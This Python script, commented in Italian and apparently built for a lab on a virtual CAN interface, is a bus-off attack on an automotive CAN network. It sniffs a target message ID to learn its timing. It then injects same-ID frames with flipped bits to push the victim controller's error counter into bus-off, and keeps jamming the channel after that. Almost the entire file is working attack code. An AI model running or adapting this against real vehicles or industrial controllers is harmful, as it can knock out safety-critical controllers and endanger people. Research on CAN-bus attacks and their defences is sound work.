import can
import time
import sys
import random

# --- CONFIGURAZIONE ---
CAN_INTERFACE = 'vcan0'
TARGET_ID = 0x123 
BUS_OFF_THRESHOLD = 256
TEC_PASSIVE_THRESHOLD = 128
SAMPLE_SIZE = 5 
INITIAL_TEC = 0
# ----------------------

# --- FUNZIONI PER LA MANIPOLAZIONE BIT ---

def bytes_to_bitstring(data):
    """Converte un array di byte in una stringa binaria (8 bit per ogni byte)."""
    return ''.join(f'{b:08b}' for b in data)

def bitstring_to_bytes(bit_string):
    """Converte una stringa binaria in un array di byte."""
    data = bytearray()
    for i in range(0, len(bit_string), 8):
        # Converte ogni sequenza di 8 bit in un intero (byte)
        data.append(int(bit_string[i:i+8], 2))
    return list(data)

def find_and_flip(data_bytes):
    """Trova il primo bit '1' (Recessivo) e lo flippa a '0' (Dominante)."""
    original_bit_string = bytes_to_bitstring(data_bytes)
    modified_bit_string = list(original_bit_string)
    flip_index = -1
    
    # Cerchiamo il primo '1' (Recessivo)
    for i in range(len(modified_bit_string)):
        if modified_bit_string[i] == '1':
            modified_bit_string[i] = '0' # Flip a Dominante (0)
            flip_index = i
            break
            
    if flip_index == -1:
        # Nessun bit Recessivo trovato (payload tutto a zero).
        return data_bytes, -1 
        
    modified_bit_string = "".join(modified_bit_string)
    modified_bytes = bitstring_to_bytes(modified_bit_string)
    
    return modified_bytes, flip_index

# --- FUNZIONE PRINCIPALE DELL'ATTACCANTE ---

def start_attacker_dynamic_final_corrected():
    
    try:
        # receive_own_messages=False è CRUCIALE
        bus = can.interface.Bus(channel=CAN_INTERFACE, interface='socketcan', receive_own_messages=False)
        print(f"✅ [Attaccante] Connesso a {CAN_INTERFACE}.")
    except OSError as e:
        print(f"❌ [Attaccante] Errore di connessione: {e}")
        return

    # Variabili di stato
    victim_tec_sim = INITIAL_TEC
    adversary_tec_sim = INITIAL_TEC
    attack_counter = 0
    
    # Variabili per la stima del periodo
    timestamps = []
    estimated_period = 0.0
    last_sniff_time = time.time()

    # --- FASE 1: STIMA SEQUENZIALE DELLA FREQUENZA (Sniffing) ---
    # (Codice di sniffing invariato)
    
    while len(timestamps) < SAMPLE_SIZE + 1:
        msg = bus.recv(timeout=None) 
        
        if msg is not None and msg.arbitration_id == TARGET_ID:
            now = time.time()
            if len(timestamps) > 0:
                interval = now - timestamps[-1]
                print(f"   [Sniff] Rilevato ID {hex(TARGET_ID)}. Intervallo misurato: {interval:.3f}s")
            
            timestamps.append(now)

            if len(timestamps) >= 2:
                estimated_period = (timestamps[-1] - timestamps[0]) / (len(timestamps) - 1)
                
    if timestamps:
        last_sniff_time = timestamps[-1]
    
    print(f"✅ [Attaccante] Stima completata. Periodo stimato (T): {estimated_period:.3f}s")
    if estimated_period < 0.01: estimated_period = 5.0

    # --- FASE 2: ATTACCO CHIRURGICO REATTIVO ---
    print(f"\n--- FASE 2: Attacco avviato con T = {estimated_period:.3f}s ---")
    
    while True: # Loop infinito per la persistenza
        
        # 1. SINCRONIZZAZIONE (Attesa reattiva)
        time_to_next_msg = last_sniff_time + estimated_period - time.time()
        if time_to_next_msg > 0:
            time.sleep(time_to_next_msg - 0.005) # Aspetta fino a 5ms prima
            
        # 2. RICEZIONE/SNIFFING DEL MESSAGGIO VITTIMA
        reference_msg = bus.recv(timeout=0.01) 
        
        if reference_msg is not None and reference_msg.arbitration_id == TARGET_ID:
            last_sniff_time = time.time() 
            
            # 3. LOGICA TEC SIMULATA E STAMPA (invariata)
            if victim_tec_sim < BUS_OFF_THRESHOLD:
                if victim_tec_sim < TEC_PASSIVE_THRESHOLD:
                    victim_tec_change, adversary_tec_change = 8, 8
                    fase_desc = "Fase 1 (Active)"
                else:
                    victim_tec_change, adversary_tec_change = 7, -1 
                    fase_desc = "Fase 2 (Passive)"
                
                victim_tec_sim += victim_tec_change
                adversary_tec_sim += adversary_tec_change
                
                print(f"\n--- CICLO ATTACCANTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
                print(f"[{fase_desc}] TEC Sim: V={victim_tec_sim} ({victim_tec_change:+d}), A={adversary_tec_sim} ({adversary_tec_change:+d})")

                if adversary_tec_sim >= BUS_OFF_THRESHOLD:
                    print("🚨🚨 [Attaccante] BUS OFF RILEVATO! Interrompo l'attacco.")
                    break
            else:
                print(f"\n--- CICLO PERSISTENTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
                print(f"🔥 [Persistenza] Vittima in Bus Off (TEC {victim_tec_sim}). Continuo a bloccare il canale...")

            
            # 4. MANIPOLAZIONE BIT CHIRURGICA
            
            # Eseguiamo la manipolazione sul payload sniffato
            modified_data, flip_index = find_and_flip(reference_msg.data)
            
            # 5. INIEZIONE DEL MESSAGGIO MALEVOLO MANIPOLATO
            if flip_index != -1:
                try:
                    msg_attack = can.Message(
                        arbitration_id=TARGET_ID,
                        data=modified_data, # Dati in formato byte (esadecimale)
                        is_extended_id=False
                    )
                    bus.send(msg_attack)
                    print(f"💣 [Attaccante] Iniettato Bit Error al bit #{flip_index}. Payload alterato: {bytes_to_bitstring(modified_data)}.")
                    
                except can.CanError:
                    print("⚠️ Errore CAN durante l'invio.")
                    pass 
            else:
                 # Se non ci sono '1' da flippare, invia un frame di blocco generico per non perdere lo slot
                 bus.send(can.Message(arbitration_id=TARGET_ID, data=[0x00]*8, is_extended_id=False))
                 print("⚠️ Impossibile flippare (payload tutto Dominante). Inviato frame di blocco generico.")
            
            attack_counter += 1

        else:
            # Se la Vittima non trasmette nello slot atteso (es. si è fermata)
            if victim_tec_sim >= BUS_OFF_THRESHOLD:
                # Continua la persistenza iniettando un frame di blocco generico
                print(f"\n--- CICLO PERSISTENTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
                bus.send(can.Message(arbitration_id=TARGET_ID, data=[0x00]*8, is_extended_id=False))
                attack_counter += 1
            else:
                # La Vittima ha jitterato: proviamo a risincronizzare
                print(f"\n--- CICLO SKIPPATO ({time.strftime('%H:%M:%S')}) ---")
                print("⚠️ Messaggio Vittima non rilevato. Riprovo al prossimo slot...")
                
        # Aggiorna il tempo base di attacco per l'iterazione successiva
        last_sniff_time = last_sniff_time + estimated_period

    bus.shutdown()
    print("\n🛑 [Attaccante] Disconnesso.")

if __name__ == '__main__':
    start_attacker_dynamic_final_corrected()
